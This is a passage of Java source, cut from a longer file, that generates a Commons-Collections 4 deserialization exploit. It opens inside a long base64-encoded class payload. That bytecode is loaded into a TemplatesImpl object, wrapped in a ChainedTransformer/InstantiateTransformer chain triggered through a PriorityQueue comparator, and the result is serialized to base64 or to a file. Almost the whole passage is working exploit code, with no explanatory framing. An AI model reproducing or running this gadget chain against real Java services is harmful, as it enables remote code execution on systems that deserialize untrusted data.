AFACgAAAAcAAL/ACEABQcAmgcBEAcBEgcBFAcAmgAA/AAXAQALAAAABAABAA0AIAEoASkAAgAHAAAAVwADAAQAAAALKyy4ATArLbYBNbEAAAACABkAAAAKAAIAAACFAAoAhgAaAAAAKgAEAAAACwAgACEAAAAAAAsBKgAcAAEAAAALASsA4AACAAAACwEsABwAAwALAAAABAABABgACADPAFIAAgAHAAAAVwACAAMAAAARKiu4ATBNLAS2ATosKrYBPLAAAAACABkAAAAOAAMAAACJAAYAigALAIsAGgAAACAAAwAAABEBNgAcAAAAAAARATcA4AABAAYACwE4ATkAAgALAAAABAABABgACAEtAS4AAgAHAAAAxwADAAQAAAAoKrYAhE0sxgAZLCu2AUNOLQS2ATotsE4stgFGTaf/6bsBPlkrtwFHvwABAAkAFQAWAT4ABAAZAAAAJgAJAAAAjwAFAJAACQCSAA8AkwAUAJQAFgCVABcAlgAcAJcAHwCZABoAAAA0AAUADwAHATgBOQADABcABQB5AT8AAwAAACgBNgAcAAAAAAAoATcA4AABAAUAIwB3AHgAAgAiAAAADAABAAUAIwB3APYAAgAoAAAADQAD/AAFBwCGUAcBPggACwAAAAQAAQE+ACgAUQBSAAIABwAAAEIABAACAAAADiorA70AhgO9AAS4AN6wAAAAAgAZAAAABgABAAAAngAaAAAAFgACAAAADgFIABwAAAAAAA4BSQDgAAEACwAAAAgAAwBsAGoAbgApAFEA3AACAAcAAAIXAAMACQAAAMoqwQCGmQAKKsAAhqcAByq2AIQ6BAE6BRkEOgYZBccAZBkGxgBfLMcAQxkGtgFYOgcDNggVCBkHvqIALhkHFQgytgFZK7YBXJkAGRkHFQgytgFgvpoADRkHFQgyOgWnAAmECAGn/9CnAAwZBisstgCjOgWn/6k6BxkGtgFGOgan/50ZBccADLsAbFkrtwFhvxkFBLYAqSrBAIaZABoZBQEttgCxsDoHuwFjWRkHtgFmtwFnvxkFKi22ALGwOge7AWNZGQe2AWa3AWe/AAMAJQByAHUAbACcAKMApABqALMAugC7AGoAAwAZAAAAbgAbAAAAogAUAKMAFwClABsApgAlAKgAKQCqADAAqwA7AKwAVgCtAF0ArgBgAKsAZgCxAGkAsgByALYAdQC0AHcAtQB+ALYAgQC4AIYAuQCPALsAlQC8AJwAvgCkAL8ApgDAALMAxAC7AMUAvQDGABoAAAB6AAwAMwAzAEUARgAIADAANgFKAUsABwB3AAcAeQFMAAcApgANAHkBTQAHAL0ADQB5AU0ABwAAAMoBNgAcAAAAAADKAUkA4AABAAAAygFOAU8AAgAAAMoBUAFRAAMAFAC2AHcAeAAEABcAswFSAHYABQAbAK8BUwB4AAYAKAAAAC8ADg5DBwCG/gAIBwCGBwClBwCG/QAXBwFUASz5AAUCCEIHAGwLDVQHAGoORwcAagALAAAACAADAGwAbgBqAAgBaAAWAAEABwAAACUAAgAAAAAACbsAAlm3AWlXsQAAAAEAGQAAAAoAAgAAABoACAAbAAA=";
        b64.encodeObj(cc4Demo(b64Str));

        // 反序列化
//        byte[] bytes = Base64.getDecoder().decode(base64Str);
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        objectInputStream.readObject();
    }

    public String make(Class<?> clazz) throws Exception {
        B64 b64 = new B64();
        return b64.encodeObj(cc4Demo(b64.encodeJavaClass(clazz)));
    }

    public void makeFile(Class<?> clazz, String fileName) throws Exception {
        B64 b64 = new B64();
        Object object = cc4Demo(b64.encodeJavaClass(clazz));
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(fileName));
        oos.writeObject(object);
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }
    public static Object cc4Demo(String base64Payload) throws Exception {
        byte[] bytes = java.util.Base64.getDecoder().decode(base64Payload);
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytes, ClassFiles.classAsBytes(Foo.class)});
        Reflections.setFieldValue(templates, "_name", "anystr");
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());


        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates})};

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return queue;
    }
}
